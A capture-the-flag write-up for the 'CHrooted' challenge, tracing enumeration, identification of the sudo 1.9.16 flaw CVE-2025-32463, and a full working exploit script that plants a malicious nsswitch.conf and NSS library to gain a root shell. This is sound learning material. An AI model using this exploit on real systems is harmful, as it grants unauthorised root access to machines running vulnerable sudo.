# Challenge #1
***Name:*** CHrooted(Easy)
* Managed to gain access to a server
* Look for vulnerabilities on the server
### Solutions{Steps taken}
##### Look at the script inside the home directory. Tell me the name of the tool which the script invokes.
***Result:*** ```linPEAS```
{
1. Entered the ```ls -la``` command to view everything in the directory
2. Once I discovered the the ```.sh``` file, I used ```cat``` to view it
3. ```cat run-linpeas.sh``` Allowed me to view contents
}
###### The version of the native system tool that the script detects as potentially vulnerable
***Result:*** ```1.9.16```
{
1. Entered ```sudo --version``` to discover the version of the tool
}
###### CVE(s) that are associated with that version of the software from 2025.
***Result:*** ```[CVE-2025-32463](https://nvd.nist.gov/vuln/detail/cve-2025-32463)```
{
1. After gaining an understanding of the tooland the tool version I was able to perform a quick google search for the vulnerability
2. I found out that this vulnerability *allows local users to obtain root access*
}
###### Exploit the vulnerability to get the flag
***Result:*** ```SKY-PRIV-2332```
{
1. Create a prompt to access root
```
# Create a workspace
WORKDIR=$(mktemp -d)
cd "$WORKDIR"
mkdir -p etc libnss_

# Create the malicious config
echo "passwd: /pwn" > etc/nsswitch.conf
cp /etc/group etc/


# Create and compile the malicious library
echo -e '#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) void init(void) { setreuid(0,0); setregid(0,0); execl("/bin/bash", "/bin/bash", NULL); }' > pwn.c
gcc -shared -fPIC -o libnss_/pwn.so.2 pwn.c

# Trigger the exploit to become root
sudo -R "$WORKDIR" /bin/sh
```
2. Enter ```cat /root/flag.txt```
}
